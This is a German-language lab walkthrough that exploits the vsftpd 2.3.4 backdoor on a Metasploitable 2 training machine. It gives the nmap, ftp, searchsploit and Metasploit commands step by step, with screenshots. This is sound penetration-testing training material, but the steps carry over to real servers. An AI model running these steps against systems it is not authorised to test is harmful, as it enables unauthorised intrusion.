# FTP

## Nmap-Scan

Als erstes sollte ein Nmap-Scan durchgeführt werden, um zu sehen, ob der Metasploitable 2 Server FTP hat:

``` bash
nmap -sV -sC <IP-Adresse>
```

![Bild01.jpg](/images/Metaspolitable-2/FTP/Bild01.jpg)

## FTP-Server-Verbindung

Um sich mit dem FTP-Server zu verbinden, kann man den folgenden Code verwenden. Man kann sich mit Anonymous ohne Passwort anmelden, wie im Nmap-Scan zu sehen ist:

``` bash
ftp <IP-Adresse>
```

![Bild02.jpg](/images/Metaspolitable-2/FTP/Bild02.jpg)

## Bash-Exploit-Suche

Um zu kontrollieren, ob es einen Exploit gibt, kann man den folgenden Befehl ausführen:

``` bash
searchsploit vsftpd 2.3.4
```

![Bild03.jpg](/images/Metaspolitable-2/FTP/Bild03.jpg)

## Starten der Metasploit-Konsole

Wenn man einen Exploit gefunden hat, der mit Metasploit funktioniert, kann man das Metasploit-Tool verwenden, um den Exploit zu starten. Dafür muss man zuerst die Metasploit-Konsole starten:

``` bash
msfconsole
```

![Bild04.jpg](/images/Metaspolitable-2/FTP/Bild04.jpg)

## Suche nach dem Exploit in der Metasploit-Konsole

Nachdem die Konsole gestartet wurde, muss man noch einmal nach dem Exploit suchen:

``` bash
search vsftpd 2.3.4
```

![Bild05.jpg](/images/Metaspolitable-2/FTP/Bild05.jpg)

## Auswahl des Exploits

Um den Exploit auszuwählen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):

``` bash
use 0
```

![Bild06.jpg](/images/Metaspolitable-2/FTP/Bild06.jpg)

## Anzeigen von Optionen

Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:

``` bash
show options
```

![Bild07.jpg](/images/Metaspolitable-2/FTP/Bild07.jpg)

## Optionen setzen

Danach kann man mit dem folgenden Befehl die Option setzen:

``` bash
set RHOSTS <IP-Adresse>
```

![Bild08.jpg](/images/Metaspolitable-2/FTP/Bild08.jpg)

## Starten des Exploits

Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:

``` bash
run
```

![Bild09.jpg](/images/Metaspolitable-2/FTP/Bild09.jpg)

